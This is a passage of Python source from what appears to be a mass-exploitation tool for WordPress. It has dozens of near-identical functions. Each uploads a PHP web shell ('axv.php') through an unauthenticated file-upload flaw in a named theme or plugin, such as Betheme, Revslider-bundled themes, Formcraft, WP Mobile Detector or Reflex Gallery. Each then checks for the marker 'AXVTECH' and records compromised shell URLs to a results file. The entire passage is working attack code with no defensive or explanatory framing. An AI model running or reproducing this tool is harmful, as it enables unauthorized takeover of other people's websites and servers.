		p = ('https://' + url + '/wp-content/themes/konzept/includes/uploadify/upload.php')
		c = ('http://' + url+'/wp-content/themes/konzept/includes/uploadify/axv.php')
		requests.post(p, headers=ua, files=data, data={'name':'axv.php'}, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Konzept -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Konzept -->> {red}Not Vuln !")
	except:pass
 
def Dancestudio(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/dance-studio/core/libs/imperavi/tests/file_upload.php')
		c = ('http://' + url+'/wp-content/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Dance Studio -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Dance Studio -->> {red}Not Vuln !")
	except:pass
 
def Cubed(url):
	try:
		data = {'uploadfile':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/cubed_v1.2/functions/upload-handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Cubed -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Cubed -->> {red}Not Vuln !")
	except:pass
 
def Amplus(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/amplus/functions/upload-handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Amplus -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Amplus -->> {red}Not Vuln !")
	except:pass
 
def Highlight(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/highlight/lib/utils/upload-handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Highlight -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Highlight -->> {red}Not Vuln !")
	except:pass
 
def Dandelion(url):
	try:
		data = {'qqfile':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/dandelion/functions/upload-handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Dandelion -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Dandelion -->> {red}Not Vuln !")
	except:pass
 
def Satoshi(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/satoshi/functions/upload-handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Satoshi -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Satoshi -->> {red}Not Vuln !")
	except:pass
 
 
def Evolve(url):
	try:
		data = {'qqfile':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/evolve/js/back-end/libraries/fileuploader/upload_handler.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Evolve -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Evolve -->> {red}Not Vuln !")
	except:pass
 
def Saico(url):
	try:
		data = {'qqfile':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/saico/framework/_scripts/valums_uploader/php.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Saico -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Saico -->> {red}Not Vuln !")
	except:pass
 
def Synoptic(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/synoptic/lib/avatarupload/upload.php')
		c = ('http://' + url+'/wp-content/uploads/markets/avatars/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Synoptic -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Synoptic -->> {red}Not Vuln !")
	except:pass
 
def Synoptic2(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/synoptic/lib/avatarupload/upload.php')
		c = ('http://' + url+'/wp-content/uploads/markets/avatars/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Synoptic2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Synoptic2 -->> {red}Not Vuln !")
	except:pass
 
def Clockstone(url):
	try:
		data = {'uploadfile':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/clockstone/theme/functions/uploadbg.php')
		c = ('http://' + url+'/wp-content/themes/clockstone/theme/functions/axv.php')
		requests.post(p, headers=ua, files=data, data={'value': './'}, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Clockstone -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Clockstone -->> {red}Not Vuln !")
	except:pass
 
def Andre(url):
	try:
		data = {'update_file':open(zipp, 'rb')}
		p = ('https://' + url + '/wp-admin/admin-ajax.php')
		c = ('http://' + url+'/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/axv.php')
		requests.post(p, headers=ua, files=data, data={'action':'revslider_ajax_action','client_action':'update_plugin'}, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Andre -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Andre -->> {red}Not Vuln !")
	except:pass
 
def Rarebird(url):
	try:
		data = {'update_file':open(zipp, 'rb')}
		p = ('https://' + url + '/wp-admin/admin-ajax.php')
		c = ('http://' + url+'/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/axv.php')
		requests.post(p, headers=ua, files=data, data={'action':'revslider_ajax_action','client_action':'update_plugin'}, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Rarebird -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Rarebird -->> {red}Not Vuln !")
	except:pass
 
def Pindol(url):
	try:
		data = {'update_file':open(zipp, 'rb')}
		p = ('https://' + url + '/wp-admin/admin-ajax.php')
		c = ('http://' + url+'/wp-content/themes/pindol/revslider/temp/update_extract/revslider/axv.php')
		requests.post(p, headers=ua, files=data, data={'action':'revslider_ajax_action','client_action':'update_plugin'}, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Pindol -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Pindol -->> {red}Not Vuln !")
	except:pass
 
def Cuckootap(url):
	try:
		data = {'update_file':open(zipp, 'rb')}
		p = ('https://' + url + '/wp-admin/admin-ajax.php')
		c = ('http://' + url+'/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/axv.php')
		requests.post(p, headers=ua, files=data, data={'action':'revslider_ajax_action','client_action':'update_plugin'}, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Cuckootap -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Cuckootap -->> {red}Not Vuln !")
	except:pass
 
def Beach_Apollo(url):
	try:
		data = {'update_file':open(zipp, 'rb')}
		p = ('https://' + url + '/wp-admin/admin-ajax.php')
		c = ('http://' + url+'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/axv.php')
		requests.post(p, headers=ua, files=data, data={'action':'revslider_ajax_action','client_action':'update_plugin'}, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Beach_Apollo -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Beach_Apollo -->> {red}Not Vuln !")
	except:pass
 
def Centum(url):
	try:
		data = {'update_file':open(zipp, 'rb')}
		p = ('https://' + url + '/wp-admin/admin-ajax.php')
		c = ('http://' + url+'/wp-content/themes/centum/revslider/temp/update_extract/revslider/axv.php')
		requests.post(p, headers=ua, files=data, data={'action':'revslider_ajax_action','client_action':'update_plugin'}, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Centum -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Centum -->> {red}Not Vuln !")
	except:pass
 
def Medicate(url):
	try:
		data = {'update_file':open(zipp, 'rb')}
		p = ('https://' + url + '/wp-admin/admin-ajax.php')
		c = ('http://' + url+'/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/axv.php')
		requests.post(p, headers=ua, files=data, data={'action':'revslider_ajax_action','client_action':'update_plugin'}, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Medicate -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Medicate -->> {red}Not Vuln !")
	except:pass
 
def Money(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/MoneyTheme/uploads/upload.php')
		c = ('http://' + url+'/wp-content/themes/MoneyTheme/uploads/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Money -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Money -->> {red}Not Vuln !")
	except:pass
 
def Betheme(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/betheme/muffin-options/fields/upload/field_upload.php')
		c = ('http://' + url+'/wp-content/themes/betheme/muffin-options/fields/upload/Files/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Betheme -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Betheme -->> {red}Not Vuln !")
	except:pass
 
def Flipbook(url):
	try:
		data = {'qqfile':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/flipbook/php.php')
		c = ('http://' + url+'/wp-includes/fb-images/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Flipbook -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Flipbook -->> {red}Not Vuln !")
	except:pass
 
def Wpstorecart(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/wpstorecart/php/upload.php')
		c = ('http://' + url+'/wp-content/uploads/wpstorecart/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Wpstorecart -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Wpstorecart -->> {red}Not Vuln !")
	except:pass
 
def Dzsvideogallery(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/dzs-videogallery/admin/upload.php')
		c = ('http://' + url+'/wp-content/plugins/dzs-videogallery/admin/upload/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Dzs Videogallery -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Dzs Videogallery -->> {red}Not Vuln !")
	except:pass
 
def Adsmanager(url):
	try:
		data = {'uploadfile':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php')
		c = ('http://' + url+'/wp-content/plugins/simple-ads-manager/axv.php')
		requests.post(p, headers=ua, data={'action':'upload_ad_image','path': '/'}, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Simple Ads Manager -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Simple Ads Manager -->> {red}Not Vuln !")
	except:pass
 
def Wpproperty(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/wp-property/third-party/uploadify/uploadify.php')
		c = ('http://' + url+'/wp-content/plugins/wp-property/third-party/uploadify/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}WP Property -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}WP Property -->> {red}Not Vuln !")
	except:pass
 
def Tevolution(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php')
		c = ('http://' + url+'/wp-content/themes/Directory/images/tmp/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Tevolution -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Tevolution -->> {red}Not Vuln !")
	except:pass
 
def Userupload(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/wordpress-member-private-conversation/doupload.php')
		c = ('http://' + url+'/wp-content/uploads/user_uploads/test/axv.php')
		requests.post(p, headers=ua, files=data, data={'folder': '/test/'}, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}User Uploads -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}User Uploads -->> {red}Not Vuln !")
	except:pass
 
def Assetmanager(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/asset-manager/upload.php')
		c = ('http://' + url+'/wp-content/uploads/assets/temp/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Asset Manager -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Asset Manager -->> {red}Not Vuln !")
	except:pass
 
def Cnhk(url):
	try:
		data = {'slideshow':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/cnhk-slideshow/uploadify/uploadify.php')
		c = ('http://' + url+'/wp-content/plugins/cnhk-slideshow/uploadify/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Chnk Slideshow -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Chnk Slideshow -->> {red}Not Vuln !")
	except:pass
 
def Cstmbckgrn(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/custom-background/uploadify/uploadify.php')
		c = ('http://' + url+'/wp-content/plugins/custom-background/uploadify/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Custom Background -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Custom Background -->> {red}Not Vuln !")
	except:pass
 
def Workthe(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php')
		c = ('http://' + url+'/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Work The Flow -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Work The Flow -->> {red}Not Vuln !")
	except:pass
 
def Workthe2(url):
	try:
		data = {'file':open(phpjpg, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php')
		c = ('http://' + url+'/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Work The Flow 2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Work The Flow 2 -->> {red}Not Vuln !")
	except:pass
 
def Category(url):
	try:
		data = {'qqfile':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/category-page-icons/include/wpdev-flash-uploader.php')
		c = ('http://' + url+'/wp-content/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Category Page Icons -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Category Page Icons -->> {red}Not Vuln !")
	except:pass
 
def Category2(url):
	try:
		data = {'qqfile':open(phpjpg, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/category-page-icons/include/wpdev-flash-uploader.php')
		c = ('http://' + url+'/wp-content/axv.php.jpg')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Category Page Icons 2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Category Page Icons 2 -->> {red}Not Vuln !")
	except:pass
 
def Assg(url):
	try:
		data = {'uploadfiles[]':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/uploads/assignments/ms-sitemple.php')
		c = ('http://' + url+'/wp-content/uploads/assignments/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Assignments -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Assignments -->> {red}Not Vuln !")
	except:pass
 
def Wpmobile(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/wp-mobile-detector/resize.php')
		c = ('http://' + url+'/wp-content/plugins/wp-mobile-detector/cache/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}WP Mobile Detector -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}WP Mobile Detector -->> {red}Not Vuln !")
	except:pass
 
def Devtools2(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/developer-tools/libs/swfupload/upload.php')
		c = ('http://' + url+'/wp-content/plugins/developer-tools/libs/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Developer Tools 2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Developer Tools 2 -->> {red}Not Vuln !")
	except:pass
 
def Genesis(url):
	try:
		data = {'file':open(phpjpg, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/genesis-simple-defaults/uploadFavicon.php')
		c = ('http://' + url+'/wp-content/uploads/favicon/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Genesis Simple Defaults -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Genesis Simple Defaults -->> {red}Not Vuln !")
	except:pass
 
def Acffrontend(url):
	try:
		data = {'files':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/acf-frontend-display/js/blueimp-jQuery-File-Upload-d45deb1/server/php/index.php')
		c = ('http://' + url+'/wp-content/uploads/uigen_'+str(tahun)+'/' + 'axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Acf Frontend -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Acf Frontend -->> {red}Not Vuln !")
	except:pass
 
def Picaphoto(url):
	try:
		data = {'uploadfile':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/pica-photo-gallery/picaPhotosResize.php')
		c = ('http://' + url+'/wp-content/uploads/pica-photo-gallery/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Pica Photo Gallery -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Pica Photo Gallery -->> {red}Not Vuln !")
	except:pass
 
def Formcraft(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/formcraft/file-upload/server/php/upload.php')
		c = ('http://' + url+'/wp-content/plugins/formcraft/file-upload/server/php/files/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Formcraft -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Formcraft -->> {red}Not Vuln !")
	except:pass
 
def Wpshop(url):
	try:
		data = {'wpshop_file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload')
		c = ('http://' + url+'/wp-content/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}WP Shop -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}WP Shop -->> {red}Not Vuln !")
	except:pass
 
def Pitchprint(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/pitchprint/uploader/')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Pitchprint -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Pitchprint -->> {red}Not Vuln !")
	except:pass
 
def Barclaycart(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/barclaycart/uploadify/uploadify.php')
		c = ('http://' + url+'/wp-content/plugins/barclaycart/uploadify/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Barclaycart -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Barclaycart -->> {red}Not Vuln !")
	except:pass
 
def Reflexgal(url):
	try:
		data = {'qqfile':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php?Year='+str(tahun)+'&Month='+str(bulan))
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Reflex Gallery -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
